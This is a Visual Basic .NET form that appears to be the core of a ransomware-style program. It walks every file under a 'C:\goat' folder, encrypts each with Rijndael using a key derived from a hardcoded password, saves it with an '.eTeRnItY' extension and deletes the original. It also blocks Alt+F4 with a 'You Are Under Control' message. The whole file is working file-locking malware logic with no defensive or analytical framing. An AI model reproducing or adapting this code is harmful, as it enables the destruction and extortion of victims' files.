Imports System.IO
Imports System.Security.Cryptography

Public Class Form2

    Private Sub Form2_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles Me.KeyDown
        If e.KeyData = Keys.Alt + Keys.F4 Then
            MessageBox.Show("You Are Under Control", "", MessageBoxButtons.OK, MessageBoxIcon.Hand)
            e.Handled = True
        End If

    End Sub

    Private Sub Form2_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
        For Each foundFile As String In My.Computer.FileSystem.GetFiles(
             "C:\goat", FileIO.SearchOption.SearchAllSubDirectories)
            If foundFile.EndsWith(".eTeRnItY") Then
            Else
                ListBox1.Items.Add(foundFile)
            End If

        Next
    End Sub
    Dim strFileToEncrypt As String
    Dim strFileToDecrypt As String
    Dim strOutputEncrypt As String
    Dim strOutputDecrypt As String
    Dim filenamez As String
    Dim fsInput As System.IO.FileStream
    Dim fsOutput As System.IO.FileStream
    Public Function CreateKey(ByVal strPassword As String) As Byte()
        'Convert strPassword to an array and store in chrData.
        Dim chrData() As Char = strPassword.ToCharArray
        'Use intLength to get strPassword size.
        Dim intLength As Integer = chrData.GetUpperBound(0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim bytDataToHash(intLength) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        'Declare what hash to use.
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        'Declare bytResult, Hash bytDataToHash and store it in bytResult.
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        'Declare bytKey(31).  It will hold 256 bits.
        Dim bytKey(31) As Byte

        'Use For Next to put a specific size (256 bits) of
        'bytResult into bytKey. The 0 To 31 will put the first 256 bits
        'of 512 bits into bytKey.
        For i As Integer = 0 To 31
            bytKey(i) = bytResult(i)
        Next

        Return bytKey 'Return the key.
    End Function
    Public Function CreateIV(ByVal strPassword As String) As Byte()
        'Convert strPassword to an array and store in chrData.
        Dim chrData() As Char = strPassword.ToCharArray
        'Use intLength to get strPassword size.
        Dim intLength As Integer = chrData.GetUpperBound(0)
        'Declare bytDataToHash and make it the same size as chrData.
        Dim bytDataToHash(intLength) As Byte

        'Use For Next to convert and store chrData into bytDataToHash.
        For i As Integer = 0 To chrData.GetUpperBound(0)
            bytDataToHash(i) = CByte(Asc(chrData(i)))
        Next

        'Declare what hash to use.
        Dim SHA512 As New System.Security.Cryptography.SHA512Managed
        'Declare bytResult, Hash bytDataToHash and store it in bytResult.
        Dim bytResult As Byte() = SHA512.ComputeHash(bytDataToHash)
        'Declare bytIV(15).  It will hold 128 bits.
        Dim bytIV(15) As Byte

        'Use For Next to put a specific size (128 bits) of
        'bytResult into bytIV. The 0 To 30 for bytKey used the first 256 bits.
        'of the hashed password. The 32 To 47 will put the next 128 bits into bytIV.
        For i As Integer = 32 To 47
            bytIV(i - 32) = bytResult(i)
        Next

        Return bytIV 'return the IV
    End Function
    Public Enum CryptoAction
        'Define the enumeration for CryptoAction.
        ActionEncrypt = 1
        ActionDecrypt = 2
    End Enum

    Public Sub EncryptOrDecryptFile(ByVal strInputFile As String, _
                                     ByVal strOutputFile As String, _
                                     ByVal bytKey() As Byte, _
                                     ByVal bytIV() As Byte, _
                                     ByVal Direction As CryptoAction)
        Try 'In case of errors.

            'Setup file streams to handle input and output.
            fsInput = New System.IO.FileStream(strInputFile, FileMode.Open, _
                                               FileAccess.Read)
            fsOutput = New System.IO.FileStream(strOutputFile, FileMode.OpenOrCreate, _
                                                FileAccess.Write)
            fsOutput.SetLength(0) 'make sure fsOutput is empty

            'Declare variables for encrypt/decrypt process.
            Dim bytBuffer(4096) As Byte 'holds a block of bytes for processing
            Dim lngBytesProcessed As Long = 0 'running count of bytes processed
            Dim lngFileLength As Long = fsInput.Length 'the input file's length
            Dim intBytesInCurrentBlock As Integer 'current bytes being processed
            Dim csCryptoStream As CryptoStream
            'Declare your CryptoServiceProvider.
            Dim cspRijndael As New System.Security.Cryptography.RijndaelManaged
            'Setup Progress Bar
            ProgressBar2.Value = 0
            ProgressBar2.Maximum = 100

            'Determine if ecryption or decryption and setup CryptoStream.
            Select Case Direction
                Case CryptoAction.ActionEncrypt
                    csCryptoStream = New CryptoStream(fsOutput, _
                    cspRijndael.CreateEncryptor(bytKey, bytIV), _
                    CryptoStreamMode.Write)

                Case CryptoAction.ActionDecrypt
                    csCryptoStream = New CryptoStream(fsOutput, _
                    cspRijndael.CreateDecryptor(bytKey, bytIV), _
                    CryptoStreamMode.Write)
            End Select

            'Use While to loop until all of the file is processed.
            While lngBytesProcessed < lngFileLength
                'Read file with the input filestream.
                intBytesInCurrentBlock = fsInput.Read(bytBuffer, 0, 4096)
                'Write output file with the cryptostream.
                csCryptoStream.Write(bytBuffer, 0, intBytesInCurrentBlock)
                'Update lngBytesProcessed
                lngBytesProcessed = lngBytesProcessed + CLng(intBytesInCurrentBlock)
                'Update Progress Bar
                ProgressBar2.Value = CInt((lngBytesProcessed / lngFileLength) * 100)
            End While

            'Close FileStreams and CryptoStream.
            csCryptoStream.Close()
            fsInput.Close()
            fsOutput.Close()

            'If encrypting then delete the original unencrypted file.
            If Direction = CryptoAction.ActionEncrypt Then
                Dim fileOriginal As New FileInfo(strFileToEncrypt)
                fileOriginal.Delete()
            End If

            'If decrypting then delete the encrypted file.
            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileEncrypted As New FileInfo(strFileToDecrypt)
                fileEncrypted.Delete()
            End If

            'Update the user when the file is done.
            Dim Wrap As String = Chr(13) + Chr(10)
            If Direction = CryptoAction.ActionEncrypt Then
                MsgBox("Encryption Complete" + Wrap + Wrap + _
                        "Total bytes processed = " + _
                        lngBytesProcessed.ToString, _
                        MsgBoxStyle.Information, "Done")

                'Update the progress bar and textboxes.


            Else
                'Update the user when the file is done.
                MsgBox("Decryption Complete" + Wrap + Wrap + _
                       "Total bytes processed = " + _
                        lngBytesProcessed.ToString, _
                        MsgBoxStyle.Information, "Done")

                'Update the progress bar and textboxes.

            End If


            'Catch file not found error.
        Catch When Err.Number = 53 'if file not found
            MsgBox("Please check to make sure the path and filename" + _
                    "are correct and if the file exists.", _
                     MsgBoxStyle.Exclamation, "Invalid Path or Filename")

            'Catch all other errors. And delete partial files.
        Catch
            fsInput.Close()
            fsOutput.Close()

            If Direction = CryptoAction.ActionDecrypt Then
                Dim fileDelete As New FileInfo(filenamez)
                fileDelete.Delete()



            Else
                Dim fileDelete As New FileInfo(filenamez)
                fileDelete.Delete()

            End If

        End Try
    End Sub
    
    Private Sub Timer1_Tick(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Timer1.Tick
        ProgressBar1.Maximum = ListBox1.Items.Count
        If ProgressBar1.Value = ListBox1.Items.Count Then
            Timer1.Stop()
            Form3.Show()
            Me.Hide()
        Else

            ListBox1.SelectedIndex = ProgressBar1.Value

            ListBox1.SelectionMode = SelectionMode.One
            filenamez = CStr(ListBox1.SelectedItem)
            Try
                Dim bytKey As Byte()
                Dim bytIV As Byte()
                'Send the password to the CreateKey function.
                bytKey = CreateKey("sameeraperera")
                'Send the password to the CreateIV function.
                bytIV = CreateIV("sameeraperera")
                'Start the encryption.
                EncryptOrDecryptFile(filenamez, filenamez + ".eTeRnItY", _
                                     bytKey, bytIV, CryptoAction.ActionEncrypt)
            Catch ex As Exception
                Me.Hide()

            End Try
            ProgressBar1.Increment(1)
            Label1.Text = filenamez

        End If
    End Sub
End Class